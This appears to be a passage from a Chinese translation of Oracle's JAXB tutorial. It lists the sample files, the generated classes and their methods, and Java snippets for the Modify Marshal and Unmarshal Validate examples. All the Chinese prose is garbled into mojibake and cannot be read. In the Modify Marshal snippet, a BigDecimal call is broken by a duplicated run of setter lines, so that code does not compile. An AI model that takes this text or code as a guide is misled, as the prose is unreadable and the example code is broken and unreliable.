ç¼–è¾‘ã€‚</p><p>åŸºæœ¬å’Œè‡ªå®šä¹‰ç¤ºä¾‹ç›®å½•åŒ…å«å‡ ä¸ªåŸºæœ¬æ–‡ä»¶ï¼š</p><ul><li><code>po.xsd</code>æ˜¯ XML æ¨¡å¼ï¼Œç”¨ä½œ JAXB ç»‘å®šç¼–è¯‘å™¨çš„è¾“å…¥ï¼Œå°†ä»æ¨¡å¼æ´¾ç”Ÿçš„ JAXB Java ç±»ç”Ÿæˆã€‚å¯¹äºè‡ªå®šä¹‰å†…è”å’Œæ•°æ®ç±»å‹è½¬æ¢å™¨ç¤ºä¾‹ï¼Œæ­¤æ–‡ä»¶åŒ…å«å†…è”ç»‘å®šè‡ªå®šä¹‰ã€‚</li><li><code>po.xml</code>æ˜¯åŒ…å«ç¤ºä¾‹ XML å†…å®¹çš„é‡‡è´­è®¢å• XML æ–‡ä»¶ï¼Œå®ƒæ˜¯æ¯ä¸ªç¤ºä¾‹ä¸­è§£ç»„åˆ° Java å†…å®¹æ ‘ä¸­çš„æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åœ¨æ¯ä¸ªç¤ºä¾‹ä¸­å‡ ä¹ç›¸åŒï¼›æœ‰ç»†å¾®çš„å†…å®¹å·®å¼‚æ¥çªå‡ºä¸åŒçš„ JAXB æ¦‚å¿µã€‚</li><li><code>Main.java</code>æ˜¯æ¯ä¸ªç¤ºä¾‹çš„ä¸»è¦ Java ç±»ã€‚</li><li><code>build.xml</code>æ˜¯ä¸€ä¸ªä¸ºæ‚¨æä¾›æ–¹ä¾¿çš„ Ant é¡¹ç›®æ–‡ä»¶ã€‚ä½¿ç”¨ Ant å·¥å…·è‡ªåŠ¨ç”Ÿæˆã€ç¼–è¯‘å’Œè¿è¡Œæ¨¡å¼æ´¾ç”Ÿçš„ JAXB ç±»ã€‚è¯¥<code>çš„build.xml</code>æ–‡ä»¶è·¨è¶Šä¾‹å­å˜åŒ–ã€‚</li><li><code>inline-customize</code>ç¤ºä¾‹ä¸­çš„<code>MyDatatypeConverter.java</code>æ˜¯ä¸€ä¸ª Java ç±»ï¼Œç”¨äºæä¾›è‡ªå®šä¹‰æ•°æ®ç±»å‹è½¬æ¢ã€‚</li><li>å¤–éƒ¨å®šåˆ¶ç¤ºä¾‹ä¸­çš„<code>binding.xjb</code>æ˜¯ä¸€ä¸ªå¤–éƒ¨ç»‘å®šå£°æ˜æ–‡ä»¶ï¼Œå®ƒè¢«ä¼ é€’åˆ° JAXB ç»‘å®šç¼–è¯‘å™¨ä»¥å®šåˆ¶é»˜è®¤çš„ JAXB ç»‘å®šã€‚</li></ul><p>ä¸‹è¡¨ç®€è¦æè¿°äº†åŸºæœ¬çš„ã€å®šåˆ¶çš„å’Œ java-to-schema JAXB ç¤ºä¾‹ã€‚</p><table><thead><tr><th>Example Name</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/basic.html#bnbaz">Modify Marshal</a></td><td>æ¼”ç¤ºå¦‚ä½•ä¿®æ”¹Javaå†…å®¹æ ‘ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/basic.html#bnbbc">Unmarshal Validate</a></td><td>æ¼”ç¤ºå¦‚ä½•åœ¨è§£ç»„æœŸé—´å¯ç”¨éªŒè¯</td></tr></tbody></table><p>è¡¨:å®šåˆ¶JAXBç¤ºä¾‹</p><table><thead><tr><th>Example Name</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/custom.html#bnbbz">Customize Inline</a></td><td>æ¼”ç¤ºå¦‚ä½•é€šè¿‡åœ¨ XML æ¨¡å¼ä¸­ä½¿ç”¨å†…è”æ³¨é‡Šæ¥è‡ªå®šä¹‰é»˜è®¤ JAXB ç»‘å®šã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/custom.html#bnbci">Datatype Converter</a></td><td>è¯´æ˜ XML <code>simpleType</code>å®šä¹‰åˆ° Java æ•°æ®ç±»å‹çš„æ›¿ä»£ã€æ›´ç®€æ´çš„ç»‘å®šï¼Œç±»ä¼¼äºè‡ªå®šä¹‰å†…è”ç¤ºä¾‹ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/custom.html#bnbcs">External Customize</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨å¤–éƒ¨ç»‘å®šå£°æ˜æ–‡ä»¶å°†åªè¯»æ¨¡å¼çš„ç»‘å®šè‡ªå®šä¹‰ä¼ é€’ç»™ JAXB ç»‘å®šç¼–è¯‘å™¨ã€‚</td></tr></tbody></table><p>è¡¨:javaåˆ°æ¨¡å¼çš„JAXBç¤ºä¾‹</p><table><thead><tr><th>Example Name</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbcw">Create Marshal</a></td><td>æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ ObjectFactory ç±»åˆ›å»º Java å†…å®¹æ ‘å¹¶å°†å…¶ç¼–ç»„ä¸º XML æ•°æ®ã€‚å®ƒè¿˜æ¼”ç¤ºäº†å¦‚ä½•å‘ JAXB åˆ—è¡¨å±æ€§æ·»åŠ å†…å®¹ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbcz">XmlAccessorOrder</a></td><td>è¯´æ˜å¦‚ä½•åœ¨ Java ç±»ä¸­ä½¿ç”¨<code>@XmlAccessorOrder</code>å’Œ<code>@XmlType.propOrder</code>æ˜ å°„æ³¨é‡Šæ¥æ§åˆ¶ Java ç±»å‹ç¼–ç»„æˆ–è§£ç»„ XML å†…å®¹çš„é¡ºåºã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbdf">XmlAdapter</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨æ¥å£<code>XmlAdapter</code>å’Œæ³¨é‡Š<code>@XmlJavaTypeAdapter</code>æä¾› XML å†…å®¹è¿›å‡º<code>HashMap</code>ï¼ˆå­—æ®µï¼‰çš„è‡ªå®šä¹‰æ˜ å°„ï¼Œè¯¥å­—æ®µä½¿ç”¨æ•´æ•° ( <code>int</code> ) ä½œä¸ºé”®ï¼Œå°†å­—ç¬¦ä¸² ( <code>String</code> ) ä½œä¸ºå€¼ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbdi">XmlAttribute</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨è§£<code>@XmlAttribute</code>å®šä¹‰è¦ä½œä¸º XML å±æ€§å¤„ç†çš„å±æ€§æˆ–å­—æ®µã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbdl">XmlRootElement</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š<code>@XmlRootElement</code>ä¸ºç›¸åº”ç±»çš„ XML æ¶æ„ç±»å‹å®šä¹‰ XML å…ƒç´ åç§°ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbdo">XmlSchemaType Class</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š<code>@XmlSchemaType</code>è‡ªå®šä¹‰å±æ€§æˆ–å­—æ®µåˆ° XML å†…ç½®ç±»å‹çš„æ˜ å°„ã€‚</td></tr><tr><td><a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/j2schema.html#bnbdr">XmlType</a></td><td>è¯´æ˜å¦‚ä½•ä½¿ç”¨æ³¨é‡Š<code>@XmlType</code>å°†ç±»æˆ–<code>æšä¸¾</code>ç±»å‹æ˜ å°„åˆ° XML æ¶æ„ç±»å‹ã€‚</td></tr></tbody></table><p>ä¸‹è¡¨æè¿°äº†åŸºæœ¬ç¤ºä¾‹çš„è¿™äº›ç±»åŠå…¶ä¸æºXMLæ¨¡å¼çš„ç‰¹å®šç»‘å®šã€‚</p><h3 id="è¡¨-Schema-to-Javaç»‘å®š">è¡¨:<code>Schema-to-Java</code>ç»‘å®š</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606223054.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606223054.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606223052736"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606223105.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606223105.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606223103331"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606223119.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606223119.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606223118424"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606223522.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606223522.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606223521428"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210606223530.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210606223530.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210606223529292"></p><h3 id="Schema-Derived-JAXB-Classes">Schema-Derived JAXB Classes</h3><p>ä¸‹ä¸€èŠ‚å°†ç®€è¦è§£é‡ŠJAXBç»‘å®šç¼–è¯‘å™¨ä¸ºç¤ºä¾‹ç”Ÿæˆçš„ä»¥ä¸‹å„ä¸ªç±»çš„åŠŸèƒ½:</p><ul><li>[<code>Items</code> Class](#Items` Class)</li><li>[<code>ObjectFactory</code> Class](#ObjectFactory` Class)</li><li>[<code>PurchaseOrderType</code> Class](# Class)</li><li>[<code>USAddress</code> Class](#USAddress` Class)</li></ul><h4 id="Items-Class"><code>Items</code> Class</h4><p>In <code>Items.java</code>:</p><ul><li>è¯¥<code>é¡¹ç›®</code>ç±»æ˜¯éƒ¨åˆ† <code>primer.po</code>åŒ…ã€‚</li><li>è¯¥ç±»ä¸º<code>Items</code> å’Œ<code>ItemType</code>æä¾›å…¬å…±æ¥å£ã€‚</li><li>æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ° XML ComplexTypes <code>Items</code>åŠå…¶å­å…ƒç´  <code>ItemType</code>ã€‚</li><li><code>Item</code>æä¾›äº†<code>getItem()</code>æ–¹æ³•ã€‚</li><li><code>ItemType</code>æä¾›ä»¥ä¸‹æ–¹æ³•ï¼š<ul><li><code>getPartNum();</code></li><li><code>setPartNum(String value);</code></li><li><code>getComment();</code></li><li><code>setComment(java.lang.String value);</code></li><li><code>getUSPrice();</code></li><li><code>setUSPrice(java.math.BigDecimal value);</code></li><li><code>getProductName();</code></li><li><code>setProductName(String value);</code></li><li><code>getShipDate();</code></li><li><code>setShipDate(java.util.Calendar value);</code></li><li><code>getQuantity();</code></li><li><code>setQuantity(java.math.BigInteger value);</code></li></ul></li></ul><h4 id="ObjectFactory-Class"><code>ObjectFactory</code> Class</h4><p>In <code>ObjectFactory.java</code>:</p><ul><li>æ‰€è¿°<code>çš„ObjectFactory</code>ç±»æ˜¯éƒ¨åˆ†<code>primer.po</code>åŒ…ã€‚</li><li><code>ObjectFactory</code>æä¾›äº†å·¥å‚æ–¹æ³•ï¼Œç”¨äºåœ¨ Java å†…å®¹æ ‘ä¸­å®ä¾‹åŒ–è¡¨ç¤º XML å†…å®¹çš„ Java æ¥å£ã€‚</li><li>æ–¹æ³•åç§°æ˜¯é€šè¿‡è¿æ¥ç”Ÿæˆçš„ï¼š<ul><li>å­—ç¬¦ä¸²å¸¸é‡<code>create</code>ã€‚</li><li>æ‰€æœ‰å¤–éƒ¨ Java ç±»åç§°ï¼Œå¦‚æœ Java å†…å®¹æ¥å£åµŒå¥—åœ¨å¦ä¸€ä¸ªæ¥å£ä¸­ã€‚</li><li>Java å†…å®¹æ¥å£çš„åç§°ã€‚</li></ul></li></ul><p>ä¾‹å¦‚ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äº Java æ¥å£<code>prime.po.Items.ItemType</code>ï¼Œ<code>ObjectFactory</code>åˆ›å»ºæ–¹æ³•<code>createItemsItemType()</code>ã€‚</p><h4 id="PurchaseOrderType-Class"><code>PurchaseOrderType</code> Class</h4><p>In <code>PurchaseOrderType.java</code>:</p><ul><li>æ‰€è¿°<code>PurchaseOrderType</code>ç±»æ˜¯éƒ¨åˆ†<code>primer.po</code>åŒ…ã€‚</li><li>æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ°åä¸º<code>PurchaseOrderType</code>çš„ XML æ¶æ„å­å…ƒç´ ã€‚</li><li><code>PurchaseOrderType</code>æ˜¯ä¸€ä¸ªå…¬å…±æ¥å£ï¼Œæä¾›ä»¥ä¸‹æ–¹æ³•ï¼š<ul><li><code>getItems();</code></li><li><code>setItems(primer.po.Items value);</code></li><li><code>getOrderDate();</code></li><li><code>setOrderDate(java.util.Calendar value);</code></li><li><code>getComment();</code></li><li><code>setComment(java.lang.String value);</code></li><li><code>getBillTo();</code></li><li><code>setBillTo(primer.po.USAddress value);</code></li><li><code>getShipTo();</code></li><li><code>setShipTo(primer.po.USAddress value);</code></li></ul></li></ul><h4 id="USAddress-Class"><code>USAddress</code> Class</h4><p>In <code>USAddress.java</code>:</p><ul><li>çš„<code>æ ¡èˆåœ°å€</code>ç±»æ˜¯éƒ¨åˆ† <code>primer.po</code>åŒ…ã€‚</li><li>æ­¤ç±»å®ä¾‹åŒ–ä¸­çš„å†…å®¹ç»‘å®šåˆ°åä¸º<code>USAddress</code>çš„ XML æ¨¡å¼å…ƒç´ ã€‚</li><li><code>USAddress</code>æ˜¯ä¸€ä¸ªå…¬å…±æ¥å£ï¼Œæä¾›ä»¥ä¸‹æ–¹æ³•ï¼š<ul><li><code>getState();</code></li><li><code>setState(String value);</code></li><li><code>getZip();</code></li><li><code>setZip(java.math.BigDecimal value);</code></li><li><code>getCountry();</code></li><li><code>setCountry(String value);</code></li><li><code>getCity();</code></li><li><code>setCity(String value);</code></li><li><code>getStreet();</code></li><li><code>setStreet(String value);</code></li><li><code>getName();</code></li><li><code>setName(String value);</code></li></ul></li></ul></div><h2 id="åŸºæœ¬ç¤ºä¾‹">åŸºæœ¬ç¤ºä¾‹</h2><div class="story post-story"><p>æœ¬èŠ‚ä»‹ç»äº†åŸºæœ¬ JAXB ç¤ºä¾‹ï¼ˆModify Marshalã€Unmarshal Validateï¼‰ï¼Œè¿™äº›ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ï¼š</p><ul><li>å°† XML æ–‡æ¡£è§£ç»„ä¸º Java å†…å®¹æ ‘å¹¶è®¿é—®å…¶ä¸­åŒ…å«çš„æ•°æ®</li><li>ä¿®æ”¹ Java å†…å®¹æ ‘</li><li>ä½¿ç”¨<code>ObjectFactory</code>ç±»åˆ›å»º Java å†…å®¹æ ‘ï¼Œç„¶åå°†å…¶ç¼–ç»„ä¸º XML æ•°æ®</li><li>åœ¨è§£ç»„æœŸé—´æ‰§è¡ŒéªŒè¯</li><li>åœ¨è¿è¡Œæ—¶éªŒè¯ Java å†…å®¹æ ‘</li></ul><h3 id="Modify-Marshal-Example">Modify Marshal Example</h3><p>Modify Marshalç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•ä¿®æ”¹Javaå†…å®¹æ ‘ã€‚</p><ol><li><p>è¯¥<em>JAXBé‡Œå®‰è£…</em><code>/samples/modify-marshal/src/Main.java</code>ç±»å£°æ˜å¯¼å…¥ä¸‰ç§æ ‡å‡†çš„Javaç±»ï¼Œäº”JAXBç»‘å®šæ¡†æ¶ç±»å’Œçš„<code>primer.po</code>åŒ…ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigDecimal</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBElement</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">Marshaller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">Unmarshaller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">primer<span class="token punctuation">.</span>po<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span></code></pre></li><li><p>åˆ›å»ºäº†ä¸€ä¸ª<code>JAXBContext</code>å®ä¾‹æ¥å¤„ç†åœ¨<code>prime.po</code> ä¸­ç”Ÿæˆçš„ç±»</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JAXBContext</span> jc <span class="token operator">=</span> <span class="token class-name">JAXBContext</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span> <span class="token string">"primer.po"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>åˆ›å»ºäº†ä¸€ä¸ª<code>Unmarshaller</code>å®ä¾‹ï¼Œå¹¶<code>è§£ç»„</code>äº†<code>po.xml</code>æ–‡ä»¶ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Unmarshaller</span> u <span class="token operator">=</span> jc<span class="token punctuation">.</span><span class="token function">createUnmarshaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">PurchaseOrder</span> po <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PurchaseOrder</span><span class="token punctuation">)</span>    u<span class="token punctuation">.</span><span class="token function">unmarshal</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"po.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p><code>set</code>æ–¹æ³•ç”¨äºä¿®æ”¹å†…å®¹æ ‘çš„<code>åœ°å€</code>åˆ†æ”¯ä¸­çš„ä¿¡æ¯ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">USAddress</span> address <span class="token operator">=</span> po<span class="token punctuation">.</span><span class="token function">getBillTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"John Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setStreet</span><span class="token punctuation">(</span><span class="token string">"242 Main Street"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setCity</span><span class="token punctuation">(</span><span class="token string">"Beverly Hills"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token string">"CA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setZip</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span>address<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"John Bob"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setStreet</span><span class="token punctuation">(</span><span class="token string">"242 Main Street"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setCity</span><span class="token punctuation">(</span><span class="token string">"Beverly Hills"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span><span class="token string">"CA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>address<span class="token punctuation">.</span><span class="token function">setZip</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"90210"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>åˆ›å»ºäº†ä¸€ä¸ª<code>Marshaller</code>å®ä¾‹ï¼Œå¹¶å°†æ›´æ–°çš„ XML å†…å®¹ç¼–ç»„åˆ°<code>system.out</code>ã€‚æ‰€è¿°<code>çš„setProperty</code> APIç”¨äºæŒ‡å®šè¾“å‡ºç¼–ç ; åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ˜¯æ ¼å¼åŒ–çš„ï¼ˆäººç±»å¯è¯»çš„ï¼‰XMLã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Marshaller</span> m <span class="token operator">=</span> jc<span class="token punctuation">.</span><span class="token function">createMarshaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token class-name">Marshaller</span><span class="token punctuation">.</span>JAXB_FORMATTED_OUTPUT<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span>TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">marshal</span><span class="token punctuation">(</span>po<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="Building-and-Running-the-Modify-Marshal-Example-Using-Ant">Building and Running the Modify Marshal Example Using Ant</h3><p>è¦ä½¿ç”¨ Ant ç¼–è¯‘å’Œè¿è¡Œ Modify Marshal ç¤ºä¾‹ï¼Œè¯·åœ¨ç»ˆç«¯çª—å£ä¸­ï¼Œè½¬åˆ°<em>jaxb-ri-install</em> <code>/samples/modify-marshal/</code>ç›®å½•å¹¶é”®å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="language-java" data-language="java"><code class="language-java">ant</code></pre><h3 id="Unmarshal-Validate-Example">Unmarshal Validate Example</h3><p>Unmarshal Validate ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•åœ¨è§£ç»„æœŸé—´å¯ç”¨éªŒè¯ã€‚è¯·æ³¨æ„ï¼ŒJAXB åœ¨è§£ç»„æœŸé—´æä¾›éªŒè¯åŠŸèƒ½ï¼Œä½†åœ¨ç¼–ç»„æœŸé—´ä¸æä¾›ã€‚éªŒè¯åœ¨<a href="https://docs.oracle.com/javase/tutorial/jaxb/intro/arch.html#bnazn">æ›´å¤šå…³äºéªŒè¯</a>ä¸­è¿›è¡Œäº†æ›´è¯¦ç»†çš„è§£é‡Š ã€‚</p><ol><li><p>è¯¥<em>JAXBé‡Œå®‰è£…</em><code>/samples/unmarshal-validate/src/Main.java</code>ç±»å£°æ˜ä¸ºä¸€ä¸ªæ ‡å‡†çš„Javaç±»ï¼ŒåJAXBç»‘å®šæ¡†æ¶ç±»å’Œè¿›å£<code>primer.po</code>åŒ…ï¼š</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">JAXBException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">Marshaller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">UnmarshalException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">Unmarshaller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">ValidationEvent</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">ValidationEventHandler</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>bind<span class="token punctuation">.</span></span><span class="token class-name">ValidationEventLocator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span></span><span class="token class-name">XMLConstants</span><span class="token punctuation">.</span>W3C_XML_SCHEMA_NS_URI<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">SchemaFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>validation<span class="token punctuation">.</span></span><span class="token class-name">Schema</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">primer<span class="token punctuation">.</span>po<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span></code></pre></li><li><p>åˆ›å»ºäº†ä¸€ä¸ª<code>JAXBContext</code>å®ä¾‹æ¥å¤„ç†åœ¨<code>prime.po</code>åŒ…ä¸­ç”Ÿæˆçš„ç±»ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">JAXBContext</span> jc <span class="token operator">=</span> <span class="token class-name">JAXBContext</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"primer.po"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>ä¸€ä¸ª<code>Unmarshaller</code>çš„å®ä¾‹è¢«åˆ›å»ºã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Unmarshaller</span> u <span class="token operator">=</span> jc<span class="token punctuation">.</span><span class="token function">createUnmarshaller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>é»˜è®¤çš„ JAXB <code>Unmarshaller ``ValidationEventHandler</code>å·²å¯ç”¨ä»¥å‘<code>system.out</code>å‘é€éªŒè¯è­¦å‘Šå’Œé”™è¯¯ã€‚é»˜è®¤é…ç½®ä¼šå¯¼è‡´è§£ç»„æ“ä½œåœ¨é‡åˆ°ç¬¬ä¸€ä¸ªéªŒè¯é”™è¯¯æ—¶å¤±è´¥ã€‚</p><pre class="language-java" data-language="java"><code class="language-java">u<span class="token punctuation">.</span><span class="token function">setValidating</span><span class="token punctuation">(</span> <span class="token boolean">true</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>å°è¯•å°†<code>po.xml</code>æ–‡ä»¶è§£ç»„ä¸º Java å†…å®¹æ ‘ã€‚å‡ºäºæœ¬ç¤ºä¾‹çš„ç›®çš„ï¼Œ<code>po.xml</code>æ–‡ä»¶åŒ…å«æ•…æ„é”™è¯¯</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">PurchaseOrder</span> po <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">PurchaseOrder</span><span class="token punctuation">)</span>u<span class="token punctuation">.</span><span class="token function">unmarshal</span><span class="token punctuation">(</span>    <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"po.xml"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token 